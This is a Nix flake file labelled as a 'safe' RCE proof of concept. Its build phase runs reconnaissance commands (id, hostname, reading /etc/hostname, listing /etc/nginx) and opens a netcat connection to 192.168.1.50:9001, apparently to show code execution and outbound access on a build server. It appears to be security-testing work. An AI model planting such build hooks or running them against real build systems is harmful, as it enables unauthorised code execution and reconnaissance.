{
  description = "Shitob security RCE proof (safe)";

  outputs = { self, nixpkgs }: {
    packages.x86_64-linux.default =
      let
        pkgs = import nixpkgs { system = "x86_64-linux"; };
      in
      pkgs.stdenv.mkDerivation {
        name = "rce-proof";

        src = ./.;

        buildPhase = ''
          echo "=== BUILD PHASE STARTED ==="

          echo "User:"
          id

          echo "Hostname:"
          hostname

          echo "Reading /etc/hostname:"
          cat /etc/hostname || true

          echo "Trying outbound network connection test..."
          ${pkgs.netcat}/bin/nc 192.168.1.50 9001 || true

          echo "Listing /etc/nginx if exists:"
          ls /etc/nginx || true

          echo "Done build phase"
        '';

        installPhase = ''
          mkdir -p $out
          echo "ok" > $out/result.txt
        '';
      };
  };
}
